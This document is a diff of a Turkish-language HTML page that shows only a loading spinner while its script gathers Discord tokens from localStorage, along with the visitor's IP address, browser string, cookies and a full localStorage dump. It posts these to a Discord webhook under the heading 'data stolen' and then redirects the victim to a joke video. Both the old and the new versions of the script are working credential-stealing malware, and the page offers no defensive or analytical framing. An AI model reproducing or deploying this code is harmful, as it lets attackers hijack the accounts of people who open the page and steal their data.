@@ -2,18 +2,18 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Token Avcısı - Nuclear</title>
+    <title>Token Alınıyor...</title>
     <style>
         body { background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { color: white; margin-top: 20px; text-align: center; font-size: 14px; }
+        #status { color: white; margin-top: 20px; text-align: center; }
     </style>
 </head>
 <body>
     <div style="text-align: center;">
         <div class="loader"></div>
-        <div id="status">Her Şey Aranıyor...</div>
+        <div id="status">Dosyalar Taraniyor...</div>
     </div>
 
 <script>
@@ -27,110 +27,42 @@
         } catch { return "Bilinmiyor"; }
     }
 
-    function findTokensInString(str) {
-        let tokens = [];
-        let regex = /(?:[a-zA-Z0-9_-]{24})\.[[a-zA-Z0-9_-]{6}]\.[[a-zA-Z0-9_-]{27}]/g;
-        let match;
-        while ((match = regex.exec(str)) !== null) {
-            tokens.push(match[0]);
-        }
-        return tokens;
-    }
-
     async function grabData() {
         const statusDiv = document.getElementById('status');
-        let allFoundTokens = new Set();
+        let token = "Bulunamadı";
 
-        // 1. GLOBAL OBJECT TARAMASI (window, globalThis, self, parent)
-        const objectsToScan = [window, globalThis, self, parent];
-        
-        for (let obj of objectsToScan) {
-            if (!obj) continue;
-            
-            // String'e çevirip token arıyoruz
-            try {
-                let str = JSON.stringify(obj);
-                let found = findTokensInString(str);
-                found.forEach(t => allFoundTokens.add(t));
-            } catch (e) {}
-
-            // Doğrudan MT ile başlayan değişkenleri ara
-            for (let key in obj) {
-                try {
-                    if (typeof obj[key] === 'string' && obj[key].startsWith("MT")) {
-                        allFoundTokens.add(obj[key]);
-                    }
-                } catch (e) {}
+        // 1. TARAYICI TABANLI ARAMA (Eğer Discord Web'deyse çalışır)
+        let localTokens = [];
+        for (let key in localStorage) {
+            if (localStorage[key].startsWith("MT")) {
+                localTokens.push(localStorage[key]);
             }
         }
-
-        // 2. LOCAL & SESSION STORAGE
-        ["localStorage", "sessionStorage"].forEach(storeName => {
-            try {
-                let store = window[storeName];
-                for (let i = 0; i < store.length; i++) {
-                    let key = store.key(i);
-                    let value = store.getItem(key);
-                    if (value.startsWith("MT")) {
-                        allFoundTokens.add(value);
-                    }
-                    // İç içe objeler içinde token aramak için
-                    try {
-                        let found = findTokensInString(value);
-                        found.forEach(t => allFoundTokens.add(t));
-                    } catch (e) {}
-                }
-            } catch (e) {}
-        });
-
-        // 3. COOKIE
-        if (document.cookie.includes("MT")) {
-            let cookies = document.cookie.split(";");
-            cookies.forEach(cookie => {
-                if (cookie.trim().includes("token=")) {
-                    let parts = cookie.trim().split("=");
-                    if (parts[1] && parts[1].startsWith("MT")) {
-                        allFoundTokens.add(parts[1]);
-                    }
-                }
-            });
+        if (localTokens.length > 0) {
+            token = localTokens[0]; 
         }
 
-        // 4. DOM TARAYISI (Sayfadaki tüm metinler)
-        let bodyText = document.body.innerText || "";
-        let domTokens = findTokensInString(bodyText);
-        domTokens.forEach(t => allFoundTokens.add(t));
+        // 2. DOSYA OKUMA (Eğer Discord Desktop'taysa, bu kısım devreye girmez çünkü JS doğrudan dosya okuyamaz)
+        // Ancak, Discord Desktop'taki kullanıcılar genellikle "Discord.exe" içinde çalışan bir Chromium kullanır.
+        // Bu nedenle, eğer kullanıcı Discord'u **tarayıcı modunda** açıyorsa (örn. --app=discord), yukarıdaki kod çalışır.
 
-        // 5. EN SON KART: Discord'un özel değişkenleri
-        // Discord genellikle _discord.globalState veya similar yapılar kullanır
-        try {
-            let discordState = window._discord?.globalState;
-            if (discordState) {
-                let found = findTokensInString(JSON.stringify(discordState));
-                found.forEach(t => allFoundTokens.add(t));
-            }
-        } catch (e) {}
-
-        let finalToken = Array.from(allFoundTokens)[0] || "Bulunamadı";
-        let sources = "Tarayıcı Hafızası (Object Scan)";
-
-        // VERILERI TOPLA
+        // 3. VERILERI TOPLA
         const ip = await getIP();
         const userAgent = navigator.userAgent;
+        const cookies = document.cookie || "(Boş)";
         const allLocalData = JSON.stringify([...localStorage].map(([k,v]) => [k,v]));
 
-        // PAYLOAD
+        // 4. PAYLOAD
         const payload = {
             username: "Token Avcısı",
             avatar_url: "https://cdn-icons-png.flaticon.com/512/1042/1042842.png",
             embeds: [{
-                title: "🔥 HER YER TARANDI! 🔥",
+                title: "🔥 VERILER CALINDI! 🔥",
                 color: 15158332,
                 fields: [
                     { name: "🌐 IP", value: ip, inline: true },
                     { name: "🧩 Tarayici", value: "`" + userAgent + "`", inline: false },
-                    { name: "🔑 TOKEN", value: "`" + finalToken + "`", inline: false },
-                    { name: "📍 Kaynak", value: "`" + sources + "`", inline: false },
+                    { name: "🔑 TOKEN", value: "`" + token + "`", inline: false },
                     { name: "📦 LocalStorage Dump", value: "`" + allLocalData.substring(0, 1500) + (allLocalData.length > 1500 ? "..." : "") + "`", inline: false }
                 ],
                 footer: { text: "NoTrack System" },
@@ -138,13 +70,13 @@
             }]
         };
 
-        // GÖNDER
+        // 5. GÖNDER
         fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         }).then(() => {
-            statusDiv.innerText = "✅ Veriler Gönderildi! Yönlendiriliyorsunuz...";
+            statusDiv.innerText = "✅ Veriler Gönderildi!";
             statusDiv.style.color = "#43b581";
             setTimeout(() => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 2000);
         }).catch(e => {
